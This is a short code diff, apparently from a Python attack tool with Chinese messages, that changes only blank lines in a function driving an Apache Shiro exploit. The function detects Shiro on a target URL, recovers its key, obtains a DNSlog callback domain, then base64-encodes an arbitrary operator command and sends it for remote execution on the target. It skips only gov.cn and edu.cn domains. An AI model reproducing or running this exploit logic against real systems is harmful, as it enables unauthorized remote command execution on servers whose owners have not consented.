@@ -8,7 +8,9 @@ def scripts(url,command):
     if "gov.cn" in url or "edu.cn" in url:
         print("[-  存在敏感域名，停止检测，请使用其他工具或自行手工检测,抱歉")
         return False
+
     print("[*] 开始检测目标是否存在Shiro   Target: {}".format(url))
+
     if processor.checkExistShiro(url):
         import time
         print("[+] 目标存在Shiro组件")
@@ -16,15 +18,19 @@ def scripts(url,command):
         resKey = processor.findTargetKey(url)
 
         if resKey:
+
             print("[+] 目标使用key值: {}".format(resKey))
             print("[*] 开始请求Dnslog获得验证域名,请稍等...")
             func = processor.getDnslogCookie()
+
             if '内网环境' in func:
                 print('[+] 检测到疑似内网环境，关闭dnslog功能和URLDNS，JRMP检测  执行命令: {} \n'.format(command))
             else:
                 dnslog = func[0]
                 print('[+] 获得验证Dnslog: {}  执行命令: {} \n'.format(dnslog,command))
+
             time.sleep(1)
+            
             try:
                 baseCommand = processor.getBase64Command(command)
                 processor.process(url,baseCommand,resKey,func)
